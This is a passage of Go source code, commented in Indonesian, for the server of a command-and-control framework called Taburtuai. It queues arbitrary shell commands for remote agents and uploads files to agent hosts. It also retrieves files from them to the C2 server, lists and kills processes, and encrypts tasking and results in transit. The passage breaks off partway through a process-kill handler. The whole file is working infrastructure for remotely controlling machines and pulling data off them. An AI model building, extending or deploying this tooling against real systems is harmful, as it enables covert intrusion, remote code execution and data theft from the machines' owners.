package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil" // Diperlukan untuk membaca file
	"net/http"  // Diperlukan untuk http.StatusOK dll.
	"strings"

	// Diperlukan untuk operasi file sistem
	"sort"
	"strconv"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
)

// Command represents a command to be executed
type Command struct {
	ID          string            `json:"id"`
	AgentID     string            `json:"agent_id"`
	Command     string            `json:"command"`        // Nama perintah utama, bisa juga nama internal seperti "internal_process_list"
	Args        []string          `json:"args,omitempty"` // Untuk perintah 'execute' umum
	WorkingDir  string            `json:"working_dir,omitempty"`
	Timeout     int               `json:"timeout,omitempty"` // seconds
	CreatedAt   time.Time         `json:"created_at"`
	ExecutedAt  time.Time         `json:"executed_at,omitempty"`
	CompletedAt time.Time         `json:"completed_at,omitempty"`
	Status      string            `json:"status"` // pending, executing, completed, failed, timeout
	ExitCode    int               `json:"exit_code,omitempty"`
	Output      string            `json:"output,omitempty"` // Bisa output teks, atau JSON string (misal, daftar proses)
	Error       string            `json:"error,omitempty"`
	Metadata    map[string]string `json:"metadata,omitempty"`

	// --- Field Operasi Umum & File (OperationType diperbarui) ---
	OperationType   string `json:"operation_type,omitempty"`   // "execute", "upload", "download", "process_list", "process_kill", "process_start"
	SourcePath      string `json:"source_path,omitempty"`      // Untuk "download"
	DestinationPath string `json:"destination_path,omitempty"` // Untuk "upload" (tujuan di agent) atau "download" (tujuan di server)
	FileContent     []byte `json:"file_content,omitempty"`     // Untuk "upload" (konten file ke agent)
	IsEncrypted     bool   `json:"is_encrypted,omitempty"`     // Menandakan apakah FileContent (untuk upload) atau Output (untuk download) dienkripsi antar server-agent

	// --- BARU: Fields untuk Manajemen Proses ---
	ProcessName string `json:"process_name,omitempty"` // Untuk "process_start" (opsional, bisa bagian dari ProcessPath) atau "process_kill" (berdasarkan nama)
	ProcessID   int    `json:"process_id,omitempty"`   // Untuk "process_kill" (berdasarkan PID)
	ProcessPath string `json:"process_path,omitempty"` // Path lengkap ke executable untuk "process_start"
	ProcessArgs string `json:"process_args,omitempty"` // Argumen untuk "process_start" (sebagai slice of strings)
	// Sebelumnya saya sarankan ProcessArgs string, tapi []string lebih fleksibel dan aman.
	// Jika Anda tetap ingin string, agent perlu parsing.
}

// CommandQueue manages commands for agents
type CommandQueue struct {
	queues  map[string][]*Command // agentID -> commands
	active  map[string]*Command   // agentID -> currently executing command
	results map[string]*Command   // commandID -> completed command
	mutex   sync.RWMutex
}

// Global command queue
var commandQueue = &CommandQueue{
	queues:  make(map[string][]*Command),
	active:  make(map[string]*Command),
	results: make(map[string]*Command),
}

// --- BARU: Handler untuk upload file ke agent ---
func (s *TaburtuaiServer) uploadToAgent(c *gin.Context) {
	agentID := c.Param("id")

	// Pastikan agent ada dan online
	agent, exists := s.monitor.GetAgent(agentID)
	if !exists {
		c.JSON(http.StatusNotFound, APIResponse{Success: false, Error: "Agent not found"})
		return
	}
	if agent.Status != StatusOnline { //
		c.JSON(http.StatusBadRequest, APIResponse{Success: false, Error: fmt.Sprintf("Agent is %s", agent.Status)})
		return
	}

	// Ambil file dari form-data
	file, err := c.FormFile("file")
	if err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Success: false, Error: "File not provided in request: " + err.Error()})
		return
	}

	destinationPath := c.PostForm("destination_path")
	if destinationPath == "" {
		c.JSON(http.StatusBadRequest, APIResponse{Success: false, Error: "Destination path not provided"})
		return
	}

	// Baca konten file
	srcFile, err := file.Open()
	if err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Success: false, Error: "Failed to open uploaded file: " + err.Error()})
		return
	}
	defer srcFile.Close()

	fileContent, err := ioutil.ReadAll(srcFile)
	if err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Success: false, Error: "Failed to read uploaded file content: " + err.Error()})
		return
	}

	// Enkripsi konten file jika crypto manager ada
	var encryptedFileContent []byte
	isContentEncrypted := false
	if s.crypto != nil {
		encryptedString, err := s.crypto.EncryptData(fileContent) //
		if err != nil {
			LogError(SYSTEM, fmt.Sprintf("Failed to encrypt file content for agent %s: %v", agentID, err), agentID) //
			// Pertimbangkan apakah akan mengirim file tidak terenkripsi atau gagal sama sekali
			// Untuk keamanan, lebih baik gagal jika enkripsi gagal
			c.JSON(http.StatusInternalServerError, APIResponse{Success: false, Error: "Failed to encrypt file content"})
			return
		}
		encryptedFileContent = []byte(encryptedString) // CryptoManager.EncryptData mengembalikan string
		isContentEncrypted = true
		LogInfo(SYSTEM, fmt.Sprintf("File content encrypted for upload to agent %s, original size: %d, encrypted size: %d", agentID, len(fileContent), len(encryptedFileContent)), agentID) //
	} else {
		LogWarn(SYSTEM, fmt.Sprintf("Crypto manager not available. Sending file content unencrypted to agent %s.", agentID), agentID) //
		encryptedFileContent = fileContent                                                                                            // Kirim apa adanya jika tidak ada enkripsi
	}

	cmd := &Command{
		ID:              uuid.New().String(),
		AgentID:         agentID,
		Command:         "internal_upload", // Nama perintah internal untuk agent
		OperationType:   "upload",
		DestinationPath: destinationPath,
		FileContent:     encryptedFileContent,
		IsEncrypted:     isContentEncrypted,
		CreatedAt:       time.Now(),
		Status:          "pending",
		Timeout:         300, // Timeout 5 menit untuk operasi file
	}

	commandQueue.mutex.Lock()
	commandQueue.queues[agentID] = append(commandQueue.queues[agentID], cmd)
	commandQueue.mutex.Unlock()

	LogCommand(agentID, fmt.Sprintf("UPLOAD %s to %s", file.Filename, destinationPath), "Queued for upload", true) //

	c.JSON(http.StatusOK, APIResponse{
		Success: true,
		Message: "File upload command queued successfully",
		Data:    map[string]interface{}{"command_id": cmd.ID, "status": cmd.Status},
	})
}

// --- BARU: Handler untuk download file dari agent ---
func (s *TaburtuaiServer) downloadFromAgent(c *gin.Context) {
	agentID := c.Param("id")

	agent, exists := s.monitor.GetAgent(agentID) //
	if !exists {
		c.JSON(http.StatusNotFound, APIResponse{Success: false, Error: "Agent not found"})
		return
	}
	if agent.Status != StatusOnline { //
		c.JSON(http.StatusBadRequest, APIResponse{Success: false, Error: fmt.Sprintf("Agent is %s", agent.Status)})
		return
	}

	var req struct {
		SourcePath      string `json:"source_path" binding:"required"`
		DestinationPath string `json:"destination_path"` // Path di server C2 untuk menyimpan file, bisa opsional
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Success: false, Error: "Invalid request: " + err.Error()})
		return
	}

	// Jika DestinationPath tidak disediakan, kita bisa membuat nama file default atau menyimpannya dengan ID perintah
	// Untuk sekarang, kita akan meneruskannya ke metadata perintah, dan submitResult akan menanganinya.
	cmdDestinationPath := req.DestinationPath
	if cmdDestinationPath == "" {
		// Buat path default jika tidak ada, misalnya di ./downloads/<agent_id>/<filename_dari_sourcepath>
		// Ini memerlukan parsing nama file dari SourcePath
	}

	cmd := &Command{
		ID:              uuid.New().String(),
		AgentID:         agentID,
		Command:         "internal_download", // Nama perintah internal untuk agent
		OperationType:   "download",
		SourcePath:      req.SourcePath,
		DestinationPath: cmdDestinationPath, // Ini adalah path di server C2 tempat file akan disimpan
		CreatedAt:       time.Now(),
		Status:          "pending",
		Timeout:         300, // Timeout 5 menit
	}

	commandQueue.mutex.Lock()
	commandQueue.queues[agentID] = append(commandQueue.queues[agentID], cmd)
	commandQueue.mutex.Unlock()

	LogCommand(agentID, fmt.Sprintf("DOWNLOAD %s", req.SourcePath), "Queued for download", true) //

	c.JSON(http.StatusOK, APIResponse{
		Success: true,
		Message: "File download command queued successfully",
		Data:    map[string]interface{}{"command_id": cmd.ID, "status": cmd.Status},
	})
}

// --- AKHIR BARU ---

// executeCommand - POST /api/v1/command
func (s *TaburtuaiServer) executeCommand(c *gin.Context) {
	var req struct {
		AgentID    string            `json:"agent_id" binding:"required"`
		Command    string            `json:"command" binding:"required"`
		Args       []string          `json:"args,omitempty"`
		WorkingDir string            `json:"working_dir,omitempty"`
		Timeout    int               `json:"timeout,omitempty"`
		Metadata   map[string]string `json:"metadata,omitempty"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{ // Menggunakan http.StatusBadRequest
			Success: false,
			Error:   "Invalid request: " + err.Error(),
		})
		return
	}

	// Check if agent exists and is online
	agent, exists := s.monitor.GetAgent(req.AgentID) //
	if !exists {
		c.JSON(http.StatusNotFound, APIResponse{ // Menggunakan http.StatusNotFound
			Success: false,
			Error:   "Agent not found",
		})
		return
	}

	if agent.Status != StatusOnline { //
		c.JSON(http.StatusBadRequest, APIResponse{ // Menggunakan http.StatusBadRequest
			Success: false,
			Error:   fmt.Sprintf("Agent is %s", agent.Status),
		})
		return
	}

	// Create command
	cmd := &Command{
		ID:            uuid.New().String(),
		AgentID:       req.AgentID,
		Command:       req.Command,
		OperationType: "execute", // --- BARU: Tandai sebagai perintah eksekusi ---
		Args:          req.Args,
		WorkingDir:    req.WorkingDir,
		Timeout:       req.Timeout,
		CreatedAt:     time.Now(),
		Status:        "pending",
		Metadata:      req.Metadata,
	}

	if cmd.Timeout == 0 {
		cmd.Timeout = 300 // Default 5 minutes
	}

	// Add to queue
	commandQueue.mutex.Lock()
	commandQueue.queues[req.AgentID] = append(commandQueue.queues[req.AgentID], cmd)
	commandQueue.mutex.Unlock()

	// Log command
	LogCommand(req.AgentID, req.Command, "Queued", true) //

	c.JSON(http.StatusOK, APIResponse{ // Menggunakan http.StatusOK
		Success: true,
		Message: "Command queued successfully",
		Data: map[string]interface{}{
			"command_id": cmd.ID,
			"status":     cmd.Status,
			"position":   len(commandQueue.queues[req.AgentID]),
		},
	})
}

// getNextCommand - GET /api/v1/command/:id/next
func (s *TaburtuaiServer) getNextCommand(c *gin.Context) {
	agentID := c.Param("id")

	// Verify agent
	if _, exists := s.monitor.GetAgent(agentID); !exists { //
		c.JSON(http.StatusNotFound, APIResponse{Success: false, Error: "Agent not found"})
		return
	}

	commandQueue.mutex.Lock()
	defer commandQueue.mutex.Unlock()

	// Check if agent has active command
	if active, exists := commandQueue.active[agentID]; exists {
		// Check for timeout
		if active.Timeout > 0 && time.Since(active.ExecutedAt) > time.Duration(active.Timeout)*time.Second {
			active.Status = "timeout"
			active.CompletedAt = time.Now()
			active.Error = "Command execution timeout"
			commandQueue.results[active.ID] = active
			delete(commandQueue.active, agentID)

			LogCommand(agentID, active.Command, "Timeout", false) //
		} else {
			// --- MODIFIKASI: Kirim data terenkripsi jika crypto ada ---
			var responseData interface{} = active // Default unencrypted
			if s.crypto != nil {
				cmdJSON, err := json.Marshal(active)
				if err != nil {
					LogError(SYSTEM, fmt.Sprintf("Failed to marshal active command for agent %s: %v", agentID, err), agentID) //
				} else {
					encrypted, err := s.crypto.EncryptData(cmdJSON) //
					if err != nil {
						LogError(SYSTEM, fmt.Sprintf("Failed to encrypt active command for agent %s: %v", agentID, err), agentID) //
					} else {
						responseData = map[string]string{"encrypted": encrypted}
						LogInfo(SYSTEM, fmt.Sprintf("Sending encrypted ACTIVE command to agent %s", agentID), agentID) //
					}
				}
			} else {
				LogInfo(SYSTEM, fmt.Sprintf("Sending unencrypted active command to agent %s", agentID), agentID) //
			}
			c.JSON(http.StatusOK, APIResponse{Success: true, Data: responseData})
			// --- AKHIR MODIFIKASI ---
			return
		}
	}

	// Get next command from queue
	if queue, exists := commandQueue.queues[agentID]; exists && len(queue) > 0 {
		cmd := queue[0]
		commandQueue.queues[agentID] = queue[1:]

		// Mark as executing
		cmd.Status = "executing"
		cmd.ExecutedAt = time.Now()
		commandQueue.active[agentID] = cmd

		// --- MODIFIKASI: Enkripsi perintah sebelum mengirim ---
		var responseData interface{} = cmd // Default unencrypted

		// Khusus untuk upload, FileContent sudah dienkripsi oleh handler uploadToAgent
		// jadi kita tidak mengenkripsi ulang seluruh objek cmd jika itu adalah upload.
		// Agent akan mendekripsi FileContent secara spesifik.
		// Namun, untuk konsistensi, kita bisa mengenkripsi seluruh payload JSON.
		// Jika cmd.OperationType adalah "upload", cmd.FileContent sudah berisi data terenkripsi (sebagai []byte string base64).
		// Agent harus tahu cara menanganinya.
		// Untuk sekarang, kita akan mengenkripsi seluruh objek Command.

		if s.crypto != nil {
			cmdJSON, err := json.Marshal(cmd)
			if err != nil {
				LogError(SYSTEM, fmt.Sprintf("Failed to marshal command for agent %s: %v", agentID, err), agentID) //
			} else {
				encrypted, err := s.crypto.EncryptData(cmdJSON) //
				if err != nil {
					LogError(SYSTEM, fmt.Sprintf("Failed to encrypt command for agent %s: %v", agentID, err), agentID) //
				} else {
					responseData = map[string]string{"encrypted": encrypted}
					LogInfo(SYSTEM, fmt.Sprintf("Encrypting and sending command (ID: %s, Type: %s) to agent %s", cmd.ID, cmd.OperationType, agentID), agentID) //
				}
			}
		} else {
			LogInfo(SYSTEM, fmt.Sprintf("Sending unencrypted command (ID: %s, Type: %s) to agent %s", cmd.ID, cmd.OperationType, agentID), agentID) //
		}
		c.JSON(http.StatusOK, APIResponse{Success: true, Data: responseData})
		// --- AKHIR MODIFIKASI ---
		return
	}

	// No command found
	c.JSON(http.StatusNoContent, nil) // Sesuai dengan implementasi agent yang mengharapkan 204 jika tidak ada perintah
}

// submitCommandResult - POST /api/v1/command/result
func (s *TaburtuaiServer) submitCommandResult(c *gin.Context) {
	var reqData []byte
	var err error

	if c.Request.Body != nil {
		reqData, err = ioutil.ReadAll(c.Request.Body)
		if err != nil {
			c.JSON(http.StatusBadRequest, APIResponse{Success: false, Error: "Failed to read request body: " + err.Error()})
			return
		}
	}

	var encryptedPayloadCheck struct {
		EncryptedPayload string `json:"encrypted_payload"`
	}
	// isFullPayloadEncrypted tidak lagi secara langsung mengontrol dekripsi field,
	// tapi tetap berguna untuk mengetahui apakah payload awal perlu didekripsi.
	if err := json.Unmarshal(reqData, &encryptedPayloadCheck); err == nil && encryptedPayloadCheck.EncryptedPayload != "" {
		if s.crypto != nil {
			LogInfo(SYSTEM, "Received fully encrypted command result payload, decrypting...", "")
			decryptedData, derr := s.crypto.DecryptData(encryptedPayloadCheck.EncryptedPayload) //
			if derr != nil {
				LogError(SYSTEM, fmt.Sprintf("Failed to decrypt command result payload: %v", derr), "")
				c.JSON(http.StatusBadRequest, APIResponse{Success: false, Error: "Failed to decrypt result payload: " + derr.Error()})
				return
			}
			reqData = decryptedData
			LogInfo(SYSTEM, "Command result payload decrypted successfully", "")
		} else {
			LogError(SYSTEM, "Received encrypted_payload but no crypto manager configured on server.", "")
			c.JSON(http.StatusInternalServerError, APIResponse{Success: false, Error: "Server cannot process encrypted payload."})
			return
		}
	}

	var req struct {
		CommandID string `json:"command_id" binding:"required"`
		ExitCode  int    `json:"exit_code"`
		Output    string `json:"output"`    // Ini adalah output yang mungkin dienkripsi oleh agent
		Error     string `json:"error"`     // Ini juga mungkin dienkripsi oleh agent
		Encrypted bool   `json:"encrypted"` // Flag dari agent menandakan Output/Error dienkripsi
	}

	if err := json.Unmarshal(reqData, &req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{
			Success: false,
			Error:   "Invalid request format after potential payload decryption: " + err.Error(),
		})
		return
	}

	// --- PERBAIKAN UTAMA DI SINI ---
	// Selalu periksa req.Encrypted (dari agent) untuk mendekripsi field Output dan Error,
	// terlepas dari apakah seluruh payload CommandResult dienkripsi untuk transport.
	if req.Encrypted && s.crypto != nil {
		if req.Output != "" {
			LogInfo(SYSTEM, fmt.Sprintf("Decrypting agent-encrypted 'Output' field for command %s", req.CommandID), "") //
			decryptedOutput, errDecOutput := s.crypto.DecryptData(req.Output)                                           //
			if errDecOutput == nil {
				req.Output = string(decryptedOutput)
				LogInfo(SYSTEM, fmt.Sprintf("'Output' field decrypted successfully for command %s, size: %d", req.CommandID, len(decryptedOutput)), "") //
			} else {
				LogError(SYSTEM, fmt.Sprintf("Failed to decrypt agent-encrypted 'Output' field for command %s: %v", req.CommandID, errDecOutput), "") //
				// Tambahkan ke error atau biarkan output terenkripsi, tergantung preferensi.
				// Di sini kita tambahkan ke error agar terlihat.
				if req.Error != "" {
					req.Error += " | "
				}
				req.Error += fmt.Sprintf("(server failed to decrypt agent's output: %v)", errDecOutput)
			}
		}
		// Asumsikan jika req.Encrypted true, field Error juga mungkin dienkripsi oleh agent
		if req.Error != "" && !(strings.Contains(req.Error, "server failed to decrypt agent's output")) { // Jangan dekripsi ulang error yang sudah kita tambahkan
			LogInfo(SYSTEM, fmt.Sprintf("Decrypting agent-encrypted 'Error' field for command %s", req.CommandID), "") //
			decryptedError, errDecError := s.crypto.DecryptData(req.Error)                                             //
			if errDecError == nil {
				req.Error = string(decryptedError)
				LogInfo(SYSTEM, fmt.Sprintf("'Error' field decrypted successfully for command %s", req.CommandID), "") //
			} else {
				LogError(SYSTEM, fmt.Sprintf("Failed to decrypt agent-encrypted 'Error' field for command %s: %v", req.CommandID, errDecError), "") //
				// Biarkan error terenkripsi jika dekripsi gagal, atau tambahkan pesan
			}
		}
	}
	// --- AKHIR PERBAIKAN UTAMA ---

	commandQueue.mutex.Lock()
	defer commandQueue.mutex.Unlock()

	var cmd *Command
	var agentIDForCmd string
	for agentIDLoop, active := range commandQueue.active {
		if active.ID == req.CommandID {
			cmd = active
			agentIDForCmd = agentIDLoop
			delete(commandQueue.active, agentIDForCmd)
			break
		}
	}

	if cmd == nil {
		// Periksa apakah sudah ada di results (mungkin karena race condition atau pengiriman ulang)
		if existingResult, exists := commandQueue.results[req.CommandID]; exists {
			LogWarn(SYSTEM, fmt.Sprintf("Received result for already completed command %s. Updating.", req.CommandID), existingResult.AgentID) //
			cmd = existingResult                                                                                                               // Gunakan hasil yang ada untuk diupdate
		} else {
			c.JSON(http.StatusNotFound, APIResponse{
				Success: false,
				Error:   "Command not found in active queue or results.",
			})
			return
		}
	}

	cmd.CompletedAt = time.Now()
	cmd.ExitCode = req.ExitCode
	cmd.Output = req.Output // Sekarang ini seharusnya sudah plaintext jika enkripsi berhasil
	cmd.Error = req.Error   // Ini juga

	if req.ExitCode == 0 && !strings.Contains(cmd.Error, "server failed to decrypt") { // Jangan set completed jika server gagal dekripsi
		cmd.Status = "completed"
	} else {
		cmd.Status = "failed"
	}

	// ... (sisa fungsi, termasuk penanganan hasil download dan logging, tetap sama seperti sebelumnya) ...
	// Penanganan khusus untuk hasil download
	if cmd.OperationType == "download" && cmd.Status == "completed" {
		if cmd.DestinationPath == "" {
			LogWarn(SYSTEM, fmt.Sprintf("Download completed for command %s by agent %s, but no server destination path was set. Output might be in cmd.Output if small.", cmd.ID, cmd.AgentID), cmd.AgentID)
		} else {
			// Pastikan direktori ada
			// err := os.MkdirAll(filepath.Dir(cmd.DestinationPath), 0755)
			// if err != nil { ... }
			err := ioutil.WriteFile(cmd.DestinationPath, []byte(cmd.Output), 0644)
			if err != nil {
				cmd.Error += fmt.Sprintf(" | Server failed to save downloaded file to %s: %v", cmd.DestinationPath, err)
				cmd.Status = "failed" // Set status gagal jika penyimpanan file gagal
				LogError(SYSTEM, fmt.Sprintf("Failed to save downloaded file for command %s to %s: %v", cmd.ID, cmd.DestinationPath, err), cmd.AgentID)
			} else {
				// Update cmd.Output dengan pesan sukses yang lebih informatif, bukan konten file
				savedOutputLen := len(cmd.Output) // Simpan panjang output asli sebelum ditimpa
				cmd.Output = fmt.Sprintf("File successfully downloaded from agent and saved to server at %s (Size: %d bytes)", cmd.DestinationPath, savedOutputLen)
				LogInfo(SYSTEM, fmt.Sprintf("File for command %s downloaded by agent %s and saved to %s", cmd.ID, cmd.AgentID, cmd.DestinationPath), cmd.AgentID)
			}
		}
	} else if cmd.OperationType == "upload" && cmd.Status == "completed" {
		LogInfo(SYSTEM, fmt.Sprintf("Upload command %s to agent %s completed. Agent output: %s", cmd.ID, cmd.AgentID, cmd.Output), cmd.AgentID)
	}

	commandQueue.results[cmd.ID] = cmd

	success := cmd.Status == "completed" // Status "completed" sekarang lebih akurat
	resultLog := cmd.Output
	if len(resultLog) > 256 {
		resultLog = resultLog[:253] + "..."
	}
	if cmd.Error != "" {
		if resultLog != "" && !strings.HasPrefix(resultLog, "File successfully downloaded") { // Jangan gabung jika sudah ada pesan sukses download
			resultLog += " | Error: " + cmd.Error
		} else {
			resultLog = "Error: " + cmd.Error
		}
	}
	LogCommand(cmd.AgentID, fmt.Sprintf("%s (Type: %s)", cmd.Command, cmd.OperationType), resultLog, success)

	duration := cmd.CompletedAt.Sub(cmd.ExecutedAt)
	if cmd.ExecutedAt.IsZero() { // Jika ExecutedAt tidak pernah diset (misalnya perintah gagal sebelum eksekusi)
		duration = cmd.CompletedAt.Sub(cmd.CreatedAt)
	}
	s.monitor.RecordCommand(cmd.AgentID, cmd.Command, success, duration)

	responseMessage := "Command result processed"
	responseData := map[string]interface{}{
		"command_id": cmd.ID,
		"status":     cmd.Status,
		"duration":   duration.String(),
	}
	if cmd.OperationType == "download" && cmd.Status == "completed" {
		responseMessage = cmd.Output // Kirim pesan sukses dari server (bukan konten file)
	} else if cmd.Status == "failed" && cmd.Error != "" {
		responseMessage = fmt.Sprintf("Command failed: %s", cmd.Error)
	}

	c.JSON(http.StatusOK, APIResponse{
		Success: true, // Server berhasil memproses hasilnya, meskipun perintahnya mungkin gagal di agent
		Message: responseMessage,
		Data:    responseData,
	})
}

// getCommandStatus - GET /api/v1/command/:id/status
func (s *TaburtuaiServer) getCommandStatus(c *gin.Context) {
	commandID := c.Param("id")

	commandQueue.mutex.RLock()
	defer commandQueue.mutex.RUnlock()

	// Check results first
	if cmd, exists := commandQueue.results[commandID]; exists {
		// --- BARU: Jangan kirim FileContent yang besar dalam status ---
		cmdCopy := *cmd
		if cmdCopy.OperationType == "upload" || (cmdCopy.OperationType == "download" && len(cmdCopy.Output) > 1024) { // Jika output adalah file besar
			cmdCopy.FileContent = nil // Kosongkan konten file mentah dari respons status
			if len(cmdCopy.Output) > 1024 && cmdCopy.OperationType == "download" {
				// Beri indikasi bahwa output file ada tapi tidak disertakan di sini
				cmdCopy.Output = fmt.Sprintf("[File content too large to display in status, size: %d bytes. Downloaded to: %s]", len(cmd.Output), cmd.DestinationPath)
			}
		}
		// --- AKHIR BARU ---
		c.JSON(http.StatusOK, APIResponse{Success: true, Data: cmdCopy})
		return
	}

	// Check active commands
	for _, cmd := range commandQueue.active {
		if cmd.ID == commandID {
			// --- BARU: Jangan kirim FileContent yang besar dalam status ---
			cmdCopy := *cmd
			if cmdCopy.OperationType == "upload" {
				cmdCopy.FileContent = nil
			}
			// --- AKHIR BARU ---
			c.JSON(http.StatusOK, APIResponse{Success: true, Data: cmdCopy})
			return
		}
	}

	// Check queued commands
	for _, queue := range commandQueue.queues {
		for _, cmd := range queue {
			if cmd.ID == commandID {
				// --- BARU: Jangan kirim FileContent yang besar dalam status ---
				cmdCopy := *cmd
				if cmdCopy.OperationType == "upload" {
					cmdCopy.FileContent = nil
				}
				// --- AKHIR BARU ---
				c.JSON(http.StatusOK, APIResponse{Success: true, Data: cmdCopy})
				return
			}
		}
	}

	c.JSON(http.StatusNotFound, APIResponse{Success: false, Error: "Command not found"})
}

// getAgentCommands - GET /api/v1/agent/:id/commands
func (s *TaburtuaiServer) getAgentCommands(c *gin.Context) {
	agentID := c.Param("id")
	status := c.Query("status") // filter by status
	limit := 50

	if limitStr := c.Query("limit"); limitStr != "" {
		if l, err := strconv.Atoi(limitStr); err == nil && l > 0 {
			limit = l
		}
	}

	commandQueue.mutex.RLock()
	defer commandQueue.mutex.RUnlock()

	var commandsToReturn []*Command // Slice baru untuk menyimpan command yang akan dikembalikan

	// Kumpulkan semua command yang relevan
	var allAgentCommands []*Command

	for _, cmd := range commandQueue.results {
		if cmd.AgentID == agentID {
			if status == "" || cmd.Status == status {
				allAgentCommands = append(allAgentCommands, cmd)
			}
		}
	}
	if active, exists := commandQueue.active[agentID]; exists {
		if status == "" || active.Status == status {
			allAgentCommands = append(allAgentCommands, active)
		}
	}
	if queue, exists := commandQueue.queues[agentID]; exists {
		for _, cmd := range queue {
			if status == "" || cmd.Status == status {
				allAgentCommands = append(allAgentCommands, cmd)
			}
		}
	}

	// Sort by creation time (newest first)
	sort.Slice(allAgentCommands, func(i, j int) bool {
		return allAgentCommands[i].CreatedAt.After(allAgentCommands[j].CreatedAt)
	})

	// Limit results dan bersihkan FileContent
	for i, cmd := range allAgentCommands {
		if i >= limit {
			break
		}
		cmdCopy := *cmd // Buat salinan
		// --- BARU: Jangan kirim FileContent atau Output besar dalam list ---
		cmdCopy.FileContent = nil
		if (cmdCopy.OperationType == "download" || cmdCopy.OperationType == "execute") && len(cmdCopy.Output) > 256 {
			cmdCopy.Output = cmdCopy.Output[:253] + "..."
		}
		if len(cmdCopy.Error) > 256 {
			cmdCopy.Error = cmdCopy.Error[:253] + "..."
		}
		// --- AKHIR BARU ---
		commandsToReturn = append(commandsToReturn, &cmdCopy)
	}

	c.JSON(http.StatusOK, APIResponse{
		Success: true,
		Data: map[string]interface{}{
			"commands": commandsToReturn, // Kirim slice yang sudah dimodifikasi
			"count":    len(commandsToReturn),
		},
	})
}

// clearAgentQueue - DELETE /api/v1/agent/:id/queue
func (s *TaburtuaiServer) clearAgentQueue(c *gin.Context) {
	agentID := c.Param("id")

	commandQueue.mutex.Lock()
	defer commandQueue.mutex.Unlock()

	count := 0
	if queue, exists := commandQueue.queues[agentID]; exists {
		count = len(queue)
		delete(commandQueue.queues, agentID)                                                                         // Hapus seluruh antrian untuk agent tersebut
		LogInfo(AUDIT, fmt.Sprintf("Cleared %d pending commands for agent %s by operator", count, agentID), agentID) //
	}

	c.JSON(http.StatusOK, APIResponse{
		Success: true,
		Message: fmt.Sprintf("Cleared %d pending commands for agent %s", count, agentID),
	})
}

// getQueueStats - GET /api/v1/queue/stats
func (s *TaburtuaiServer) getQueueStats(c *gin.Context) {
	commandQueue.mutex.RLock()
	defer commandQueue.mutex.RUnlock()

	stats := map[string]interface{}{
		"total_queued":    0,
		"total_active":    len(commandQueue.active),
		"total_completed": len(commandQueue.results), // Ini adalah total hasil yang masih disimpan
		"by_agent":        make(map[string]map[string]int),
	}

	totalQueuedCount := 0
	for agentID, queue := range commandQueue.queues {
		agentQueueCount := len(queue)
		totalQueuedCount += agentQueueCount

		if _, ok := stats["by_agent"].(map[string]map[string]int)[agentID]; !ok {
			stats["by_agent"].(map[string]map[string]int)[agentID] = map[string]int{"queued": 0, "active": 0, "completed_for_agent": 0}
		}
		stats["by_agent"].(map[string]map[string]int)[agentID]["queued"] = agentQueueCount
	}
	stats["total_queued"] = totalQueuedCount

	for agentID := range commandQueue.active {
		if _, ok := stats["by_agent"].(map[string]map[string]int)[agentID]; !ok {
			stats["by_agent"].(map[string]map[string]int)[agentID] = map[string]int{"queued": 0, "active": 0, "completed_for_agent": 0}
		}
		stats["by_agent"].(map[string]map[string]int)[agentID]["active"] = 1 // Hanya 1 command bisa aktif per agent
	}

	// Menghitung completed per agent
	completedPerAgent := make(map[string]int)
	for _, cmd := range commandQueue.results {
		completedPerAgent[cmd.AgentID]++
	}
	for agentID, count := range completedPerAgent {
		if _, ok := stats["by_agent"].(map[string]map[string]int)[agentID]; !ok {
			stats["by_agent"].(map[string]map[string]int)[agentID] = map[string]int{"queued": 0, "active": 0, "completed_for_agent": 0}
		}
		stats["by_agent"].(map[string]map[string]int)[agentID]["completed_for_agent"] = count
	}

	c.JSON(http.StatusOK, APIResponse{
		Success: true,
		Data:    stats,
	})
}

// Helper function to clean old results periodically
func (cq *CommandQueue) cleanOldResults(maxAge time.Duration) {
	cq.mutex.Lock()
	defer cq.mutex.Unlock()

	cutoff := time.Now().Add(-maxAge)
	cleanedCount := 0
	for id, cmd := range cq.results {
		if cmd.CompletedAt.IsZero() { // Jika belum ada CompletedAt (seharusnya tidak terjadi untuk hasil)
			if cmd.CreatedAt.Before(cutoff) { // Fallback ke CreatedAt jika perlu
				delete(cq.results, id)
				cleanedCount++
			}
		} else if cmd.CompletedAt.Before(cutoff) {
			delete(cq.results, id)
			cleanedCount++
		}
	}
	if cleanedCount > 0 {
		LogInfo(SYSTEM, fmt.Sprintf("Cleaned %d old command results.", cleanedCount), "") //
	}
}

// Start cleanup routine
func startCommandQueueCleanup() {
	go func() {
		// Jalankan pembersihan pertama setelah beberapa saat agar tidak langsung saat startup
		time.Sleep(5 * time.Minute)
		commandQueue.cleanOldResults(24 * 7 * time.Hour) // Keep results for 7 days

		ticker := time.NewTicker(1 * time.Hour) // Kemudian setiap jam
		defer ticker.Stop()

		for range ticker.C {
			LogInfo(SYSTEM, "Running periodic command queue cleanup...", "") //
			commandQueue.cleanOldResults(24 * 7 * time.Hour)                 // Keep results for 7 days
		}
	}()
	LogInfo(SYSTEM, "Command queue cleanup routine started. Old results will be cleaned periodically.", "") //
}

func (s *TaburtuaiServer) listProcesses(c *gin.Context) {
	agentID := c.Param("id")
	if _, exists := s.monitor.GetAgent(agentID); !exists { //
		c.JSON(http.StatusNotFound, APIResponse{Success: false, Error: "Agent not found"})
		return
	}

	cmd := &Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		Command:       "internal_process_list", // Perintah internal untuk agent
		OperationType: "process_list",
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       60, // Timeout 60 detik untuk daftar proses
	}
	// Tambahkan ke antrian
	commandQueue.mutex.Lock()
	commandQueue.queues[agentID] = append(commandQueue.queues[agentID], cmd)
	commandQueue.mutex.Unlock()

	LogCommand(agentID, "LIST_PROCESSES", "Queued", true) //
	c.JSON(http.StatusOK, APIResponse{Success: true, Message: "Process list command queued", Data: gin.H{"command_id": cmd.ID}})
}

func (s *TaburtuaiServer) killProcess(c *gin.Context) {
	agentID := c.Param("id")
	agent, exists := s.monitor.GetAgent(agentID) //
	if !exists {
		c.JSON(http.StatusNotFound, APIResponse{Success: false, Error: "Agent not found"})
		return
	}
